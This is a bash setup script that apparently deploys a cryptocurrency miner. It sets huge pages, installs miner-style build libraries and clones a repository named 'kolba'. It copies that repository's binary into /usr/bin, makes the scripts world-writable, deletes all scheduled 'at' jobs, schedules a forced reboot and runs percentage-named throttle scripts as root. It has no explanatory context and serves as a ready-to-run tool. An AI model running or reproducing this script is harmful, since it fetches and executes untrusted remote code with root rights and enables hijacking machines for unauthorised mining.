#!/bin/bash

ID="$(hostname)"

THREADS="$(nproc --all)"

touch /tmp/at.txt
echo 'sudo reboot -f' >> /tmp/at.txt
at now + 12 hours < /tmp/at.txt
echo -e 'Restart job specified'
sleep 3


rm -rf /tmp/kolba/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir kolba
git clone https://github.com/terrainco/kolba.git /tmp/kolba
cd /tmp/kolba
chmod +x /tmp/kolba/kolba
chmod 777 ./*.sh
cp /tmp/kolba/kolba /usr/bin/
sleep 3


sudo apt-get install dos2unix

sudo dos2unix time1.sh
sudo dos2unix 75.sh
sudo dos2unix 50.sh
sudo dos2unix 80.sh
sudo dos2unix 65.sh
sudo dos2unix 90.sh
sudo dos2unix 40.sh

sudo ./time1.sh


